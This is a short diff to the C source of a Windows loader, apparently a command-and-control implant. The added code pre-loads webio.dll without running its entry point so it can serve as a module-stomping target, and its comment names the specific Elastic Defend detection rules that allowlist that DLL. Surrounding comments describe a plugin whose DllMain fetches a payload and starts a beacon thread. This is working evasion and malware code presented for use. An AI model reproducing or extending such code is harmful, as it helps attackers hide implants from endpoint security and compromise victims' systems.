@@ -216,10 +216,15 @@ int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
     }
     strcat(pluginPath, PLUGIN_NAME);
 
-    /* Pre-load combase so the plugin's DllMain can reach it with a plain
-     * GetModuleHandleW — calling LoadLibrary inside DllMain would recurse
-     * into the loader lock we're already holding. */
-    LoadLibraryA("combase.dll");
+    /* Pre-load webio.dll with DONT_RESOLVE_DLL_REFERENCES.
+     * webio.dll is allowlisted in multiple Elastic Defend stomping rules
+     * (defense_evasion_process_creation_from_a_stomped_module.toml,
+     * defense_evasion_potential_injection_via_module_stomping.toml) and
+     * is the empirically-validated stomping target used by StdHandleRelay.
+     * DONT_RESOLVE_DLL_REFERENCES maps the image but does not run DllMain
+     * or resolve imports — cleaner mapping shape. */
+    LoadLibraryExA("webio.dll", NULL, 0x00000001 /* DONT_RESOLVE_DLL_REFERENCES */);
+    LoadLibraryA("combase.dll");  /* fallback target */
 
     /* Loading csvhelper fires its DllMain synchronously. DllMain calls
      * GetPayload, does the slot flip, CreateThreads the beacon, and hands
